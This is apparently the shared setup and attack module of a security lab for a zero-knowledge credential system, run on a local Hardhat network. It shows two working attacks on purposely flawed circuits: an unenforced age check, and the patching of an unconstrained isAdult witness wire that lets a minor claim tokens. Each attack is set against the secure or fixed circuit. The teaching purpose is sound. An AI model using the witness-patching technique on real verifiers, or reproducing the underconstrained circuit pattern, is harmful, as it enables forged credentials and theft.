// Lab 01: shared setup and attacks, used by exploit.js (narrated) and test.js (asserted).
// Everything here runs against a local Hardhat network with runtime keys.

import { Wallet, formatUnits } from "ethers";
import { mkdirSync } from "node:fs";
import path from "node:path";
import * as snarkjs from "snarkjs";
import { readR1cs } from "r1csfile";
import { readFileSync } from "node:fs";
import { MERKLE_DEPTH } from "../../zkred.config.js";
import { circuitPaths, ROOT } from "../../scripts/circuits/compile.js";
import { setupPaths } from "../../scripts/circuits/setup.js";
import { MerkleTree } from "../../scripts/lib/merkle.js";
import { createIdentity } from "../../scripts/lib/identity.js";
import { credentialLeaf, buildCircuitInput, CREDENTIAL_TYPES } from "../../scripts/lib/credential.js";
import { publishRoot } from "../../scripts/lib/issuer.js";
import { prove, verifyOffchain, toSolidityArgs } from "../../scripts/lib/prover.js";
import { deploySystem, revertReason } from "../../scripts/lib/deploy.js";
import { timestampToYYYYMMDD } from "../../scripts/lib/dates.js";
import { readWitness, patchWitness, wireIndex } from "./wtns.js";

const WORK = path.join(ROOT, "build", "lab01");
const D = MERKLE_DEPTH;

/** Deploys the secure system plus the lab gates, enrols a 17-year-old and an adult, publishes the root. */
export async function setupLab(ethers) {
  const [deployer, owner, minorWallet, adultWallet] = await ethers.getSigners();
  const issuer = Wallet.createRandom();
  const { registry, gate: secureGate } = await deploySystem(ethers, { owner, issuerAddress: issuer.address });
  const lab01aVerifier = await ethers.deployContract("Lab01aVerifier");
  const lab01bVerifier = await ethers.deployContract("Lab01bVerifier");
  const lab01bFixedVerifier = await ethers.deployContract("Lab01bFixedVerifier");
  const type = CREDENTIAL_TYPES.ENROLLED_STUDENT;
  // 01a: the SECURE CredentialGate contract, wired to the broken circuit's verifier.
  const gate01a = await ethers.deployContract("CredentialGate", [registry, lab01aVerifier, 1n, type]);
  const gate01b = await ethers.deployContract("AdultFlagGate", [registry, lab01bVerifier, 1n, type]);
  const gate01bFixed = await ethers.deployContract("AdultFlagGate", [registry, lab01bFixedVerifier, 1n, type]);

  const today = timestampToYYYYMMDD((await ethers.provider.getBlock("latest")).timestamp);
  const tree = await MerkleTree.create();
  const enrol = async (birthDate) => {
    const s = { identity: await createIdentity(), birthDate, credentialType: type };
    s.leafIndex = tree.insert(await credentialLeaf({ idCommitment: s.identity.commitment, ...s }));
    return s;
  };
  const minor = await enrol((Math.floor(today / 10000) - 17) * 10000 + (today % 10000)); // exactly 17 today
  const adult = await enrol(19990505);
  await publishRoot(registry, issuer, tree.root, { relayer: deployer });
  mkdirSync(WORK, { recursive: true });
  return { ethers, registry, secureGate, gate01a, gate01b, gate01bFixed, tree, minor, adult, minorWallet, adultWallet, today };
}

const inputFor = async (lab, student, gate) =>
  buildCircuitInput({ ...student, tree: lab.tree, scope: await gate.scope(), currentDate: lab.today, recipient: lab.minorWallet.address });

async function claim(gate, signer, proof, publicSignals, offset = 0) {
  const { a, b, c } = toSolidityArgs(proof, publicSignals);
  const [root, nullifierHash, , , currentDate] = publicSignals.slice(offset);
  try {
    await (await gate.connect(signer).claim(a, b, c, root, nullifierHash, currentDate)).wait();
    return { ok: true };
  } catch (e) {
    return { ok: false, reason: revertReason(e, gate) };
  }
}

/** Captures snarkjs logger output so it can be printed and asserted. */
function captureLogger() {
  const lines = [];
  const push = (level) => (msg) => lines.push(`${level === "warn" ? "WARN " : "INFO "} ${msg}`);
  return { lines, logger: { info: push("info"), warn: push("warn"), error: push("warn"), debug: () => {} } };
}

export async function wtnsCheck(r1cs, wtns) {
  const { lines, logger } = captureLogger();
  const ok = await snarkjs.wtns.check(r1cs, wtns, logger);
  const m = lines.map((l) => /aborting checking process at constraint (\d+)/.exec(l)).find(Boolean);
  return { ok, lines, failedConstraint: m ? Number(m[1]) : undefined };
}

/** Names of the signals appearing in constraint `i` (A * B - C = 0). */
export async function constraintSignals(r1csFile, symFile, i) {
  const names = new Map();
  for (const line of readFileSync(symFile, "utf8").split("\n")) {
    const [, varIdx, , name] = line.split(",");
    if (name && !names.has(varIdx)) names.set(varIdx, name);
  }
  const r1cs = await readR1cs(r1csFile, { loadConstraints: true, loadMap: false });
  const wires = [...new Set(r1cs.constraints[i].flatMap((lc) => Object.keys(lc)))];
  return wires.map((w) => (w === "0" ? "1 (constant)" : names.get(w) ?? `wire ${w}`));
}

async function tokenBalance(lab, gate, address) {
  const token = await lab.ethers.getContractAt("ZKredToken", await gate.token());
  return token.balanceOf(address);
}

/**
 * 01a: the age result is computed but never enforced.
 * The minor uses the ORDINARY prover - no witness tricks.
 */
export async function attack01a(lab, log = console.log) {
  const r = {};
  log("\n=== Lab 01a: comparison computed, result never enforced ===");
  log(`Minor born ${lab.minor.birthDate}, today ${lab.today}: 17 years old.`);

  log("\n[vulnerable] honest prover, vulnerable circuit (lab01a):");
  const { proof, publicSignals } = await prove(await inputFor(lab, lab.minor, lab.gate01a), D, "lab01a");
  r.vulnProofVerifies = await verifyOffchain(proof, publicSignals, D, "lab01a");
  log(`  proof generated; verifies off-chain: ${r.vulnProofVerifies}`);
  r.vulnClaim = await claim(lab.gate01a, lab.minorWallet, proof, publicSignals);
  r.vulnBalance = await tokenBalance(lab, lab.gate01a, lab.minorWallet.address);
  log(`  CredentialGate (secure contract!) + Lab01aVerifier: claim ${r.vulnClaim.ok ? "ACCEPTED" : "rejected: " + r.vulnClaim.reason}; minor now holds ${formatUnits(r.vulnBalance, 18)} ZKRED`);

  log("\n[secure] same minor, same honest prover, secure circuit (circuits/credential.circom):");
  try {
    await prove(await inputFor(lab, lab.minor, lab.secureGate), D, "credential");
    r.secureWitness = { ok: true };
  } catch (e) {
    r.secureWitness = { ok: false, reason: String(e.message ?? e).split("\n")[0] };
  }
  log(`  witness generation ${r.secureWitness.ok ? "SUCCEEDED (bug!)" : "FAILED: " + r.secureWitness.reason}`);
  log("  -> no witness, no proof. The constraint `geq.out === 1` (C7) is unsatisfiable for a minor.");
  return r;
}

/**
 * 01b: isAdult <-- geq.out (assignment without constraint).
 * The minor computes an honest witness, patches one wire, and proves.
 */
export async function attack01b(lab, log = console.log) {
  const r = {};
  const vuln = { c: circuitPaths(D, "lab01b"), s: setupPaths(D, "lab01b") };
  const fixed = { c: circuitPaths(D, "lab01bFixed"), s: setupPaths(D, "lab01bFixed") };
  const honest = path.join(WORK, "01b_honest.wtns");
  const patched = path.join(WORK, "01b_patched.wtns");
  const printCheck = (label, res) => {
    log(`  $ snarkjs wtns check ${label}`);
    for (const l of res.lines) log(`    ${l}`);
  };

  log("\n=== Lab 01b: isAdult assigned with <-- (no constraint) ===");
  log("1. Minor computes an HONEST witness for the vulnerable circuit:");
  await snarkjs.wtns.calculate(await inputFor(lab, lab.minor, lab.gate01b), vuln.c.wasm, honest);
  const idx = wireIndex(vuln.c.sym, "main.isAdult");
  r.isAdultWire = idx;
  r.honestIsAdult = readWitness(honest).values[idx];
  log(`   main.isAdult is wire ${idx}; honest value = ${r.honestIsAdult}`);

  log("2. Minor overwrites that ONE wire with 1 (attacks/01-underconstrained/wtns.js):");
  patchWitness(honest, patched, idx, 1n);
  r.patchedIsAdult = readWitness(patched).values[idx];
  r.wires = { vulnerable: readWitness(patched).nWitness };
  const fixedHonest = path.join(WORK, "01b_fixed_layout.wtns");
  await snarkjs.wtns.calculate(await inputFor(lab, lab.minor, lab.gate01b), fixed.c.wasm, fixedHonest);
  r.wires.fixed = readWitness(fixedHonest).nWitness;
  log(`   patched isAdult = ${r.patchedIsAdult}; wire count vulnerable = ${r.wires.vulnerable}, fixed = ${r.wires.fixed} (same layout, so the check below is a fair comparison)`);

  log("3. Check the PATCHED witness against both circuits:");
  r.checkVulnerable = await wtnsCheck(vuln.c.r1cs, patched);
  printCheck(`${path.relative(ROOT, vuln.c.r1cs)} 01b_patched.wtns   # vulnerable`, r.checkVulnerable);
  r.checkFixed = await wtnsCheck(fixed.c.r1cs, patched);
  printCheck(`${path.relative(ROOT, fixed.c.r1cs)} 01b_patched.wtns   # fixed`, r.checkFixed);
  if (r.checkFixed.failedConstraint !== undefined) {
    r.failedConstraintSignals = await constraintSignals(fixed.c.r1cs, fixed.c.sym, r.checkFixed.failedConstraint);
    log(`  constraint ${r.checkFixed.failedConstraint} of the fixed circuit involves: ${r.failedConstraintSignals.join(", ")}`);
    log("  -> that is `isAdult === geq.out`, the single constraint the one-character fix (`<--` -> `<==`) adds.");
  }

  log("4. Prove from the patched witness and claim:");
  const v = await snarkjs.groth16.prove(vuln.s.zkey, patched);
  const vPub = v.publicSignals.map(BigInt);
  r.vulnPublicIsAdult = vPub[0];
  r.vulnClaim = await claim(lab.gate01b, lab.minorWallet, v.proof, vPub, 1);
  r.vulnBalance = await tokenBalance(lab, lab.gate01b, lab.minorWallet.address);
  log(`   [vulnerable] public isAdult = ${vPub[0]}; AdultFlagGate + Lab01bVerifier: claim ${r.vulnClaim.ok ? "ACCEPTED" : "rejected: " + r.vulnClaim.reason}; minor holds ${formatUnits(r.vulnBalance, 18)} ZKRED`);

  const f = await snarkjs.groth16.prove(fixed.s.zkey, patched);
  const fPub = f.publicSignals.map(BigInt);
  r.fixedVerifiesOffchain = await verifyOffchain(f.proof, fPub, D, "lab01bFixed");
  r.fixedClaim = await claim(lab.gate01bFixed, lab.minorWallet, f.proof, fPub, 1);
  log(`   [fixed] snarkjs still emits a "proof" (it does not check the witness), but it verifies: ${r.fixedVerifiesOffchain}; AdultFlagGate + Lab01bFixedVerifier: claim ${r.fixedClaim.ok ? "ACCEPTED (bug!)" : "rejected: " + r.fixedClaim.reason}`);
  return r;
}

